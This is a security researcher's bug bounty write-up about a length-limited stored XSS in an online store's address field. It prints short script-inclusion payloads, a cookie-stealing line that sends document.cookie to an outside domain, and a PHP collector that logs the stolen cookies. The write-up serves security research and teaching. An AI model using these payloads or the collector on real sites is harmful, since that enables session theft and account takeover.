---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-02-28_the-tricky-xss.md
original_filename: 2020-02-28_the-tricky-xss.md
title: The Tricky XSS
category: documents
detected_topics:
- xss
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- xss
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: 730514d13aa30b901be61f4b76eb23108ff79a9bc1e63db3ad1147c9394ce6f2
text_sha256: 63cba36a574e846cd6ab1112e2e8337994d2696ded938922c30208edcae047f7
ingested_at: '2026-06-28T07:32:01Z'
sensitivity: unknown
redactions_applied: false
---

# The Tricky XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-02-28_the-tricky-xss.md
- Source Type: markdown
- Detected Topics: xss, command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:01Z
- Redactions Applied: False
- Raw SHA256: `730514d13aa30b901be61f4b76eb23108ff79a9bc1e63db3ad1147c9394ce6f2`
- Text SHA256: `63cba36a574e846cd6ab1112e2e8337994d2696ded938922c30208edcae047f7`


## Content

---
title: "The Tricky XSS"
page_title: "The Tricky XSS – Smaran Chand"
url: "https://smaranchand.com.np/2020/02/the-tricky-xss/"
final_url: "https://smaranchand.com.np/2020/02/the-tricky-xss/"
authors: ["Smaran Chand (@smaranchand)"]
bugs: ["XSS"]
publication_date: "2020-02-28"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4747
---

[February 28, 2020](https://smaranchand.com.np/2020/02/the-tricky-xss/)

# The Tricky XSS

Hello everyone, I would like to share a riveting issue regarding XSS (Cross-Site Scripting ) I endured a few months ago. Cross-site scripting (XSS) is a type of security vulnerability typically found in web applications. XSS enables attackers to inject client-side scripts into web pages viewed by other users.

Moving towards the target, It was an online store where a user had to fill his/her address for any specific operations while playing with the textboxes and inputs I feed some random details and saved address nickname with value A<h1>A. 

And I bet it is very exciting moment for every bug hunters/pentester outta here, my eyes were looking for the “AA” but I was not able to see any reflection on the web page and then I clicked on the delete address button clicking on the button reflected my supplied HTML input with height h5 and h1. 

![](https://smaranchand.com.np/wp-content/uploads/2020/02/Screen-Shot-2020-02-23-at-18.32.50.png)

By this time I was pretty much sure that there should be an XSS for sure but in reality, while feeding the JavaScript payload I got to know that there is input length validation for 20 chars (including white spaces).

**Ohh no…**

You must be thinking, it might be frontend validation only?

I tried intercepting and adding the payload in the HTTP request but the server did not accept. Now the main challenge was to find an XSS payload with less than 20 character lengths.

I googled and found the XSS payload by Dr. Mario which was
  
  
  <script src=//14.rs>

Such a short TLD, domain name and the entire script looked like art. The Javascript payload at index page was 
  
  
  '';var msgbox;if(location.hash){eval(location.hash.slice(1))}else{alert(1)}// msgbox+1

Using the same payload at the address nickname gave an XSS alert.

![](https://smaranchand.com.np/wp-content/uploads/2020/02/Screen-Shot-2020-02-23-at-20.26.31.png)

And then I thought if it can interact with the DOM and print cookies or not since the used XSS payload or the content was not controlled by myself I thought to create my own shortest XSS payload just to alert the cookies.

I planned to get the shortest domain first after a few minutes of googling I choose to get a Punycode domain and purchased one. I got a Punycode domain just to shorten/reduce the length of the payload.

A few days back my friend Santosh aka[ Coded Brain](https://twitter.com/MRCodedBrain) attended Dr. Mario’s workshop at [Threatcon](https://www.threatcon.io/) 2019 in Kathmandu. He was very interested to share the experience and knowledge gained through. We talked about the issue and planned to exploit in a better way and discuss more.

Since I had purchased the Punycode domain it was a bit complex to set up because something was bothering the execution of the code it took us a few minutes to figure out that we were missing just a “=” and trust me it was like a CTF challenge for us, cause we started researching about execution of scripts in SpiderMonkey engine and debugging part by part. 

**The temple of Redbull has nothing to do here…**

So this was the content on the index page of the server.

![](https://smaranchand.com.np/wp-content/uploads/2020/02/Screen-Shot-2020-02-23-at-20.45.28.png)

Thankyou [Coded Brain](https://twitter.com/MRCodedBrain) for helping me in this stuff, I didn’t think it would be this easy, although all we did was manual try. Kudos !!!

![](https://smaranchand.com.np/wp-content/uploads/2020/02/Screen-Shot-2020-02-23-at-21.24.45-1.png)

The content in the index page i.e index.html contains alert(document.cookie) in a plain text format.

So my final XSS payload became 
  
  
  <script src=//ł.rip>

Saving the above payload in the address name field gave an XSS alert with cookies.

![](https://smaranchand.com.np/wp-content/uploads/2020/02/Screen-Shot-2020-02-23-at-20.49.01-1.png)  

You won’t believe but they considered as a self XSS a P5 and marked as won’t fix. And asked them if we can ask the program owner/developer to see the activity in the backend dashboard but they still said it would be a self XSS issue.

![](https://smaranchand.com.np/wp-content/uploads/2020/02/Screen-Shot-2020-02-27-at-21.38.51.png)

**Hold on bro…**

I was really fed up with this and planned to watch if it gets executed in the backend panel/dashboard or not.

I could have used XSS hunter payload but the thorn in the way was accepted length of the input data. So I thought to create my own XSS hunter kinda payload for collecting the proof of concept.

Here is the minimal code for stealing cookies and sending it to a remote server.
  
  
  document.location='https://ł.rip/save.php?c='+document.cookie;

and the source code of save.php file is given below which would save the cookie into a text file.
  
  
  <?php
  header('Location:https://yourdomain.com');
  $cookies = $_GET["c"];
  $file = fopen('logs.txt', 'a');
  fwrite($file, $cookies . "\n\n");
  ?>

All files on the server

![](https://smaranchand.com.np/wp-content/uploads/2020/02/Screen-Shot-2020-02-24-at-15.30.29.png)

whenever the script will be executed it will read the cookie from the DOM send to the remote server. 

Revised payload :
  
  
  <script src=//ł.rip>

The cookies will be saved in logs.txt file in the remote server, we can capture mouse movement, keystrokes as well.

And then I confirmed the working of the script by executing at my own end and here we go. Biscuits coming to our remote server.

![](https://smaranchand.com.np/wp-content/uploads/2020/02/Screen-Shot-2020-02-27-at-22.56.02.png)

Now opening logs.txt, just to confirm the cookies.

![](https://smaranchand.com.np/wp-content/uploads/2020/02/Screen-Shot-2020-02-27-at-23.00.45.png)

So yeah!!! Our own XSS hunter !!!

**Sad part…**

The sad part of this story is, the XSS never got executed in the shop admin dashboard/backend but I believe I was on the right path, it was worth attempting.

**Reward: EXPERIENCE**

[Bug Bounty](https://smaranchand.com.np/writeups/bug-bounty/)
